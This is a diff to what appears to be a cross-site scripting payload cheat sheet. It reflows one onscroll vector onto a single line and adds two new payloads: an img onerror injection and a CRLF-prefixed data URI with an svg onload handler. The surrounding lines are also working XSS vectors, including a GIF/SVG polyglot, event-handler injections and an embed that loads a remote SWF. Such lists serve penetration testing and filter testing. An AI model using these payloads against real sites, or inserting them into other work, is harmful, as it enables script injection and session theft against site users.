@@ -1657,10 +1657,7 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <body onfocus=alert(1)>
 <body onhashchange=alert(1)><a href=#x>click this!#x
 <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
-<body onscroll=alert(1)><br><br><br><br>
-<br><br><br><br><br><br><br><br><br><br>
-<br><br><br><br><br><br><br><br><br><br>
-<br><br><br><br><br><br><x id=x>#x
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x
 <body onresize=alert(1)>press F12!
 <body onhelp=alert(1)>press F1! (MSIE)
 <marquee onstart=alert(1)>
@@ -1673,3 +1670,5 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <select onchange=alert(1)><option>1<option>2
 <menu id=x contextmenu=x onshow=alert(1)>right click me!
 <embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
+<img/onerror=alert(1)+/src/<xss>
+%0d%0adata:text/html;text,<svg/onload=prompt(1)>
